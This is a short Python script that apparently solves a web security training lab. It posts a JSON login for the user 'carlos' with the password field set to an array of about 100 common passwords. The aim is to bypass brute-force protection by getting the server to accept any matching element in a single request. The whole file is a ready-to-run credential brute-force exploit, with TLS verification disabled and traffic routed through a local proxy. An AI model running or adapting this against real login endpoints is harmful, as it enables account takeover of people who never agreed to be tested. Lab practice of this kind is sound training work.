import requests
import sys
import urllib3
from colorama import Fore, init 
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.01:8080', 'https': 'http://127.0.0.1:8080'}
init(autoreset=True)
payload={"username": "carlos", "password": ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow","random"]}

def exploit(s, url):
    print(Fore.YELLOW + '[!] Exploiting..')
    r = s.post(url + '/login', json=payload, headers={"Content-Type":"application/json"}, verify=False, proxies=proxies)
    if 'Log out' in r.text:
        print(Fore.GREEN + '[+] Login successful.')
        print(Fore.GREEN + '[+] Congratulations, you solved the lab!')
    else:
        print(Fore.RED + '[-] Unable to login.')
        
def main():
    if len(sys.argv) != 2:
        print(Fore.YELLOW + "[+] Usage: %s <url>" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    url = sys.argv[1]
    exploit(s, url)

if __name__ == "__main__":
    main()

